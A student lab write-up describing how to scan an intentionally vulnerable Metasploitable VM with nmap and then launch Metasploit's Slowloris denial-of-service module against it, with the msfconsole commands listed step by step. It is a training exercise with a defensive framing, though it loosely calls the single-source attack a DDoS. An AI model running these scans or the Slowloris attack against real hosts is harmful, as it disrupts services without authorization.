## Overview

This lab follows up on the Vulnerability Managment lab, as it invovles exploitation and pentesting using VMware, Kali Purple, Greenbone, and Metasploitable involves setting up virtual environments to simulate attacks, identify vulnerabilities, and test security defenses through tools like Kali Purple for proactive offense, Greenbone for vulnerability assessment, and Metasploitable as a target for practicing penetration testing techniques.

## Objective

Use Kali Purple to find exploits and launching a test DDoS attack on Metasploitable.

## Technologies Used:

- VMware: Provides the virtualization platform for creating and managing the virtual machines.

- Kali Purple: Used for defensive security operations, including threat detection and incident response.

- Greenbone: Utilized for vulnerability scanning and risk assessment.

- Metasploitable: Provides an intentionally vulnerable virtual machine employed for penetration testing and validating vulnerabilities.

- msfconsole: This is the primary interface of the Metasploit Framework, accessed through the command line. This allows launching exploits against vulnerable systems, aearch for and load different modules (exploits, payloads, auxiliary modules) and perform various post-exploitation activities.

## Scanning for open/vulnerable ports on Metasploitable using 'Nmap'

- Launch VMware and run Kali purple. Open the Terminal and enter 'Nmap'.

- 'Nmap' will show information of open ports in Metasploitable.

- Enter this cmd to display a similar list of open ports, but has services associated with specific ports and its version. The correct version is important to know for the correct exploit.

      sudo nmap -sv 192.168.xxx.xxx

- Enter this cmd to display a list of ports that have open vulnerable ports.

      sudo nmap 192.168.xxx.xxx --script vuln

- This has information of types of exploits that these open ports are vulnerable to.

- One example is a DDoS attack vulnerability detailed as shown here.

- Refer 'Slowloris DOS attack' as the searchable item.
  
## Using 'msfconsole' to set up a DDoS attack to metasploitable

- Open another console terminal on Kali Purple. Enter this cmd:

      msfconsole

- Enter this following cmd to generate a list of exploits available just for Metasploitable.

      msf6 > show exploits
  
- Since the choice of vulnerability exploitation is a DDos Attack, a search must be conducted for it. 

- Enter this cmd to generate information on the specific vulnerability. 

      msf6 > search Slowloris

- After the module pulls up, enter this cmd to use it.

      msf6 > use 0

- This will access to the module, then enter:

      msf6 > info

- As it implies, this gives information on the basic options in the module.

## Setting DDoS to the target address and initiating the DDoS attack.

- Setting up rHost required to deploy the DDoS attack to our target address. Enter this cmd:

      set rhost 192.168.xxx.xxx

- View your basic options and the target address should be visible as 'rhost', as shown.

- Finally, enter this to launch the DDoS attack.

      msf6 > run

- Launch WireShark that is included in Kali Purple, and select the primary network.

- The exploit is successful as shown. The target address is seen being flooded similarly to a botnet.

- Press Ctrl+C to stop the exploit simulation.

## Final Thoughts and Conclusions

### Achieved Objectives

In this comprehensive walkthrough on how to setup and launch a DDoS attack on Metasploitable after analyzing its open ports for vulnerabilties.

### Learning Outcomes

- Port Scanning Techniques: Using Nmap to scan for open ports on a target system.

- Service Enumeration: Developed the ability to identify services running on open ports and determine their versions.

- Vulnerability Analysis: Learned how to use tools and techniques to identify vulnerabilities associated with the services running on Metasploitable.

### Real-World Applicability

Simulating a DDoS attack on Metasploitable to exploit vulnerabilities has significant real-world applicability. It allows cybersecurity professionals to understand the specific weaknesses that can be targeted by attackers to disrupt services. By identifying and exploiting these vulnerabilities in a controlled environment, teams can develop and implement stronger defense mechanisms, such as enhanced firewall rules, intrusion detection systems, and rate-limiting measures. This practice also helps in refining incident response plans, ensuring that the organization can quickly and effectively mitigate the impact of a DDoS attack, thereby maintaining service availability and protecting critical infrastructure. Additionally, it provides valuable insights for improving overall network security posture and informs the development of robust cybersecurity policies and procedures.
